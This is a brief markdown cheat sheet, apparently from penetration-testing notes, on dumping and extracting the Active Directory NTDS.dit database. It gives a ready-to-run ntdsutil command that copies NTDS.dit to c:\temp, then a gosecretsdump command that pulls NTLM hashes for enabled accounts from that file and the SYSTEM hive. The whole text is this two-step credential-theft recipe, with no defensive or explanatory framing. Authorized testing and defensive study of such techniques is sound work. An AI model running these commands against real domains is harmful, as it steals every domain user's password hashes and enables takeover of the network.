# NTDS.dit Dump
## [ntdsutil](https://github.com/clr2of8/DPAT)
```sh
ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q
```

# NTDS.dit Extract
## [gosecretsdump](https://github.com/C-Sto/gosecretsdump)
```sh
gosecretsdump -enabled -noprint  -ntds [ntds.dit] -system [SYSTEM] -out [ntlm.domain.txt]
```
